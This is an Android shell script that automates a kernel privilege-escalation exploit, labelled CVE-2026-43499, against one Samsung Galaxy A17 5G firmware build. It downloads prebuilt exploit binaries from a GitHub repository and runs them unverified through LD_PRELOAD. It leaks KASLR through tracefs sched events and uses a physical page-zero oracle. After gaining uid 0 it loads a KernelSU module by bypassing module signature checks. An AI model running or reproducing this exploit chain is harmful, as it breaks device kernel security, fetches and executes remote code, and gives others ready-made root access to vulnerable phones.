#!/system/bin/sh
# auto-a17-A176BXXU5CZE9.sh
# Automated exploit runner for Samsung Galaxy A17 5G (SM-A176B)
# Firmware: A176BXXU5CZE9  Kernel: 5.15.189-android13-3-33504235
#
# Run from adb shell or Termux with no arguments.
# Requires network access to download payloads from GitHub on first run.
# The device MUST have just booted (fresh session) — P0 oracle requires
# a cold boot state.  Reboot and run immediately after boot completes.
#
# Usage (adb):
#   adb push tools/auto-a17-A176BXXU5CZE9.sh /data/local/tmp/
#   adb shell "sh /data/local/tmp/auto-a17-A176BXXU5CZE9.sh"
#
# Usage (Termux):
#   bash auto-a17-A176BXXU5CZE9.sh

set -e

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------
REPO_RAW="https://raw.githubusercontent.com/joshvidler129-afk/Root-My-Galaxy-Payloads/main"
WORK="/data/local/tmp/a17-exploit"
EXPLOIT_SO="$WORK/cve-2026-43499-app.so"
ROOT_BIN="$WORK/cve-2026-43499-root"
KSUD_BIN="$WORK/ksud"
KO_FILE="$WORK/kernelsu.ko"

# The app payload is loaded via LD_PRELOAD; the host process just needs to
# block long enough for the exploit to complete.
HOST_BIN="/system/bin/sleep"
HOST_ARGS="3600"

# P0 oracle requires a post-boot wait window before the kernel's page-zero
# mapping settles.  Wait at least 30 s after boot before starting.
MIN_UPTIME_SEC=30

# Pselect word shift for this kernel build (android13-3-33504235).
# Value 3 was inherited from dm3q (android13-8) and may not match the
# Exynos stack layout.  Override via env var before running:
#   SLIDE_PSELECT_WORD_SHIFT=0 sh auto-a17-A176BXXU5CZE9.sh
# If the device reboots immediately on the pselect race, try 0,1,2,4,5,6
# in sequence (one per boot) until the race succeeds without panic.
PSELECT_WORD_SHIFT="${SLIDE_PSELECT_WORD_SHIFT:-3}"

# Exploit tuning knobs for A17 (adjust if reliability is poor)
EXPLOIT_ATTEMPTS="${EXPLOIT_ATTEMPTS:-32}"
PSELECT_DELAY_USEC="${PSELECT_DELAY_USEC:-50000}"
EXPLOIT_ATTEMPT_TIMEOUT_SEC="${EXPLOIT_ATTEMPT_TIMEOUT_SEC:-120}"
P0_ATTEMPT_TIMEOUT_SEC="${P0_ATTEMPT_TIMEOUT_SEC:-25}"

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
log()  { echo "[*] $*"; }
ok()   { echo "[+] $*"; }
err()  { echo "[!] $*" >&2; exit 1; }
warn() { echo "[~] $*" >&2; }

need_cmd() { command -v "$1" >/dev/null 2>&1 || err "Required command not found: $1"; }

uptime_sec() {
    read -r up _ < /proc/uptime 2>/dev/null || { echo 9999; return; }
    # strip decimal
    echo "${up%%.*}"
}

download() {
    local url="$1" dst="$2" expected_size="$3"
    if [ -f "$dst" ]; then
        local actual
        actual=$(wc -c < "$dst")
        if [ "$actual" -eq "$expected_size" ] 2>/dev/null; then
            log "Already have $(basename "$dst") ($actual bytes)"
            return 0
        else
            warn "Cached $(basename "$dst") has wrong size ($actual vs $expected_size), re-downloading"
            rm -f "$dst"
        fi
    fi
    log "Downloading $(basename "$dst") from $url"
    if command -v curl >/dev/null 2>&1; then
        curl -fsSL --retry 3 -o "$dst" "$url" || err "curl failed for $url"
    elif command -v wget >/dev/null 2>&1; then
        wget -q -O "$dst" "$url" || err "wget failed for $url"
    else
        err "No curl or wget found — cannot download payloads"
    fi
    local actual
    actual=$(wc -c < "$dst")
    if [ -n "$expected_size" ] && [ "$actual" -ne "$expected_size" ] 2>/dev/null; then
        err "Size mismatch for $(basename "$dst"): got $actual, expected $expected_size"
    fi
    ok "Downloaded $(basename "$dst") ($actual bytes)"
}

# ---------------------------------------------------------------------------
# Phase 0: Preflight
# ---------------------------------------------------------------------------
log "=== A17 Auto Exploit — SM-A176B A176BXXU5CZE9 ==="
log "Kernel: $(uname -r)"

# Verify we're on the right device
model=$(getprop ro.product.model 2>/dev/null || echo "unknown")
build=$(getprop ro.build.version.incremental 2>/dev/null || echo "unknown")
log "Device: $model  Build: $build"

case "$model" in
    SM-A176*) ;;
    *) warn "Model '$model' is not SM-A176B — offsets may not match!  Continuing anyway." ;;
esac

# Check uptime — P0 oracle needs a fresh boot
up=$(uptime_sec)
if [ "$up" -lt "$MIN_UPTIME_SEC" ] 2>/dev/null; then
    secs_left=$((MIN_UPTIME_SEC - up))
    log "Uptime ${up}s < ${MIN_UPTIME_SEC}s minimum — waiting ${secs_left}s for boot to settle..."
    sleep "$secs_left"
fi

# ---------------------------------------------------------------------------
# Phase 1: Download Payloads
# ---------------------------------------------------------------------------
log "--- Phase 1: Downloading payloads ---"
mkdir -p "$WORK"
chmod 700 "$WORK"

download \
    "$REPO_RAW/artifacts/a17-A176BXXU5CZE9/cve-2026-43499-app.so" \
    "$EXPLOIT_SO" \
    104128

download \
    "$REPO_RAW/artifacts/a17-A176BXXU5CZE9/cve-2026-43499-root" \
    "$ROOT_BIN" \
    25912

download \
    "$REPO_RAW/kernelsu/ksud-dm3q-S9180ZHS8FZF5-kdp" \
    "$KSUD_BIN" \
    4556352

download \
    "$REPO_RAW/kernelsu/android13-5.15.189_kernelsu-dm3q-S9180ZHS8FZF5.ko" \
    "$KO_FILE" \
    227224

chmod 755 "$EXPLOIT_SO" "$ROOT_BIN" "$KSUD_BIN" "$KO_FILE"

ok "All payloads ready in $WORK"

# ---------------------------------------------------------------------------
# Phase 2: Kernel-snitch check (KASLR / tracefs oracle)
# ---------------------------------------------------------------------------
log "--- Phase 2: Kernel-snitch KASLR verification ---"
# The exploit derives the kernel base from sched_blocked_reason trace events
# (SLIDE_TRACEFS_EVENT_ID=108, SLIDE_TRACEFS_WORKER_CALLER_OFF=0x001123c4).
# We verify tracefs is accessible before committing to the exploit run.
TRACEFS_ROOT=""
for mp in /sys/kernel/tracing /sys/kernel/debug/tracing; do
    if [ -f "$mp/tracing_on" ] 2>/dev/null; then
        TRACEFS_ROOT="$mp"
        break
    fi
done

if [ -z "$TRACEFS_ROOT" ]; then
    warn "tracefs not mounted at standard locations — KASLR leak via tracefs may fail"
    warn "Try: mount -t tracefs none /sys/kernel/tracing"
else
    ok "tracefs available at $TRACEFS_ROOT"
    # Ensure sched events are enabled for the KASLR leak
    if [ -f "$TRACEFS_ROOT/events/sched/sched_blocked_reason/enable" ]; then
        echo 1 > "$TRACEFS_ROOT/events/sched/sched_blocked_reason/enable" 2>/dev/null || \
            warn "Could not enable sched_blocked_reason event (may need root)"
        ok "sched_blocked_reason event enabled (event_id=108)"
    else
        warn "sched_blocked_reason event not found — KASLR leak may fail"
    fi
fi

# ---------------------------------------------------------------------------
# Phase 3: P0 Physical Oracle Setup
# ---------------------------------------------------------------------------
log "--- Phase 3: P0 physical oracle setup ---"
# The exploit uses physical page zero as an oracle to find the kernel's
# physical load offset from the set of 32 candidates (0x000000..0x1f0000).
# This REQUIRES a fresh boot — the P0 fingerprint was recorded at build time.
# If you see 'p0 oracle: no matching candidate', reboot and run again.

# Verify page-zero access is possible (requires kernel driver or /dev/mem)
if [ -c /dev/mem ] 2>/dev/null; then
    ok "/dev/mem available for P0 oracle"
else
    warn "/dev/mem not available — P0 oracle will use mmap fallback (may be slower)"
fi

log "SLIDE_PSELECT_WORD_SHIFT=$PSELECT_WORD_SHIFT (try 0-6 if pselect causes panic)"

# ---------------------------------------------------------------------------
# Phase 4: Run Exploit
# ---------------------------------------------------------------------------
log "--- Phase 4: Running CVE-2026-43499 exploit ---"
log "Attempts=$EXPLOIT_ATTEMPTS  pselect_delay=${PSELECT_DELAY_USEC}us  timeout=${EXPLOIT_ATTEMPT_TIMEOUT_SEC}s"

# Success marker left by the exploit in the working dir
SUCCESS_MARKER="$WORK/.exploit_ok"
rm -f "$SUCCESS_MARKER"

# Export all tuning knobs for the exploit .so
export EXPLOIT_ATTEMPTS="$EXPLOIT_ATTEMPTS"
export PSELECT_DELAY_USEC="$PSELECT_DELAY_USEC"
export EXPLOIT_ATTEMPT_TIMEOUT_SEC="$EXPLOIT_ATTEMPT_TIMEOUT_SEC"
export P0_ATTEMPT_TIMEOUT_SEC="$P0_ATTEMPT_TIMEOUT_SEC"
export SLIDE_PSELECT_WORD_SHIFT="$PSELECT_WORD_SHIFT"
export ROOT_UMH_PATH="$ROOT_BIN"

# The exploit .so uses __attribute__((constructor)) — it runs automatically
# when loaded via LD_PRELOAD.  We invoke a long-running host binary so the
# exploit has time to complete all attempts.
log "Launching exploit via LD_PRELOAD..."
log "  LD_PRELOAD=$EXPLOIT_SO $HOST_BIN $HOST_ARGS"

LD_PRELOAD="$EXPLOIT_SO" "$HOST_BIN" $HOST_ARGS &
EXPLOIT_PID=$!

# Monitor for success or timeout (max all attempts × timeout + 60s buffer)
MAX_WAIT=$(( EXPLOIT_ATTEMPTS * EXPLOIT_ATTEMPT_TIMEOUT_SEC + 60 ))
elapsed=0
while [ "$elapsed" -lt "$MAX_WAIT" ]; do
    sleep 5
    elapsed=$((elapsed + 5))

    # Check if KernelSU root was achieved (su -c id returns uid=0)
    if su -c "id" 2>/dev/null | grep -q "uid=0"; then
        ok "Root obtained! (elapsed ${elapsed}s)"
        break
    fi

    # Check if host process is still running
    if ! kill -0 "$EXPLOIT_PID" 2>/dev/null; then
        warn "Exploit host process exited (attempt may have completed or failed)"
        break
    fi

    log "  Still running... (${elapsed}/${MAX_WAIT}s)"
done

kill "$EXPLOIT_PID" 2>/dev/null || true
wait "$EXPLOIT_PID" 2>/dev/null || true

# Verify root access
if ! su -c "id" 2>/dev/null | grep -q "uid=0"; then
    err "Exploit did not achieve root.  Check logcat for slide-* / kernelsnitch messages.
Possible causes:
  1. Wrong SLIDE_PSELECT_WORD_SHIFT ($PSELECT_WORD_SHIFT) — reboot, try another value 0-6
  2. Not a fresh boot session — reboot and run within 2 min of boot completing
  3. KASLR leak failed — verify sched_blocked_reason event id=108 matches kernel
  4. P0 oracle miss — ensure firmware is A176BXXU5CZE9 (not another A17 variant)"
fi

ok "Root confirmed — proceeding to KernelSU installation"

# ---------------------------------------------------------------------------
# Phase 5: KernelSU Late-Load
# ---------------------------------------------------------------------------
log "--- Phase 5: KernelSU late-load ---"

# Stage ksud daemon to /data/adb/ksud
su -c "mkdir -p /data/adb"
su -c "cp '$KSUD_BIN' /data/adb/ksud"
su -c "chmod 755 /data/adb/ksud"
ok "ksud staged to /data/adb/ksud"

# Insert kernelsu.ko with signature bypass (the exploit patches check_version)
log "Inserting kernelsu.ko..."
su -c "insmod '$KO_FILE'" && ok "kernelsu.ko loaded" || \
    warn "insmod failed — the exploit may not have patched check_version yet; retrying in 5s"

sleep 5
if ! su -c "lsmod 2>/dev/null | grep -q kernelsu"; then
    su -c "insmod '$KO_FILE'" && ok "kernelsu.ko loaded (retry)" || \
        err "Failed to load kernelsu.ko — check dmesg for module loading errors"
fi

# Start ksud control channel
log "Starting ksud control channel..."
su -c "/data/adb/ksud daemon &" 2>/dev/null || true
sleep 3

# Verify KernelSU control
if su -c "/data/adb/ksud module list" 2>/dev/null | grep -q "KernelSU"; then
    ok "KernelSU control channel verified"
elif [ -d /data/adb/ksu ] 2>/dev/null; then
    ok "KernelSU data directory present — install successful"
else
    warn "KernelSU control channel not confirmed — check /data/adb/ksud status manually"
fi

# ---------------------------------------------------------------------------
# Done
# ---------------------------------------------------------------------------
log ""
ok "=== A17 exploit complete ==="
ok "Install KernelSU Manager APK to manage modules:"
ok "  https://github.com/tiann/KernelSU/releases"
ok ""
ok "If pselect caused a kernel panic and device rebooted, reboot again and run:"
ok "  SLIDE_PSELECT_WORD_SHIFT=<N> sh auto-a17-A176BXXU5CZE9.sh"
ok "where N is 0,1,2,4,5,6 (current value was $PSELECT_WORD_SHIFT, try incrementally)"
